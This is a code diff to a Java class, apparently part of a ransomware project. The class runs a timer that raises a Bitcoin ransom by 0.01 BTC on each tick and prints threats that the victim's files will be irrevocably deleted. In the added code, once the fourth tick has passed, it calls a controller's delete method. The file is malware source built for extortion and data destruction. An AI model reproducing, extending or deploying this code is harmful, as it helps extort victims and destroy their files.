@@ -1,15 +1,16 @@
+import Ransomware.RansomWareController;
+
 import java.util.TimerTask;
 
 public class PsychologicalPressure extends TimerTask {
-
+    private final RansomWareController ransomWareController;
     private float ransomAmount;
-    private boolean timeOut;
-    private boolean transactionSuccessful;
+    private int counter;
 
-    public PsychologicalPressure(float ransomAmount, boolean timeOut, boolean transactionSuccessful) {
+    public PsychologicalPressure(float ransomAmount, RansomWareController ransomWareController) {
         this.ransomAmount = ransomAmount;
-        this.timeOut = timeOut;
-        this.transactionSuccessful = transactionSuccessful;
+        counter = 0;
+        this.ransomWareController = ransomWareController;
     }
 
     @Override
@@ -17,26 +18,25 @@ public class PsychologicalPressure extends TimerTask {
         pressureTask();
     }
 
-    private void pressureTask(){
-        int minuteCounter = 0;
+    public float getRansomAmount() {
+        return ransomAmount;
+    }
 
-        try{
-            do{
-                ransomAmount += 0.01f;
-                minuteCounter++;
+    public int getCounter() {
+        return counter;
+    }
 
-                if(minuteCounter ==4){
-                    System.out.println("Pay "+ ransomAmount + " BTC immediately or your files will be irrevocably deleted.");
-                }else if(minuteCounter>4){
-                    System.out.println("Payment not arrived, your files will be irrevocably deleted");
-                }else{
-                    System.out.println("Amount to pay increased by 0,01 to "+ransomAmount+" BTC.");
-                }
-            }while (!transactionSuccessful);
-            Thread.sleep(60000000000l);
+    private void pressureTask() {
+        ransomAmount += 0.01f;
+        counter++;
 
-        } catch (InterruptedException e){
-            e.printStackTrace();
+        if (counter == 4) {
+            System.out.println("Pay "+ ransomAmount + " BTC immediately or your files will be irrevocably deleted.");
+        } else if (counter > 4) {
+            System.out.println("Payment not arrived, your files will be irrevocably deleted");
+            ransomWareController.delete();
+        } else {
+            System.out.println("Amount to pay increased by 0,01 to " + ransomAmount + " BTC.");
         }
     }
 }
